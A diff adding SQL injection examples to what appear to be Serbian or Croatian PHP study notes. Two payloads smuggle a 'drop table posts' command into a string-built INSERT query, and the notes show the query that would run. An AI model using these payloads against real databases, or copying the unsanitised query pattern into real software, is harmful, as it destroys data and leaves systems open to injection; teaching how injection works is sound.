@@ -1019,4 +1019,26 @@ Primeri:
 			$conn = null;
 		?>
 
+-> SQL Injection examples:
+
+	1. ');drop table posts where 1=1 or title='';"--
+
+		-> kod:
+
+			$sql = "INSERT INTO users(name, email, password) VALUES('$name', '$email', '$password')";
+
+		-> upit koji ce se izvrsiti:
+
+			string(108) "INSERT INTO users(name, email, password) VALUES('ee', 'aa', '');drop table posts where 1=1 or title='';"--')"
+
+	2. ');drop table posts where 1=1 or title='';"/*
+
+		-> kod:
+
+			$sql = "INSERT INTO users(name, email, password) VALUES('$name', '$email', '$password')";
+
+		-> upit koji ce se izvrsiti:
+
+			string(108) "INSERT INTO users(name, email, password) VALUES('ee', 'aa', '');drop table posts where 1=1 or title='';"/*')"
+
 45. 
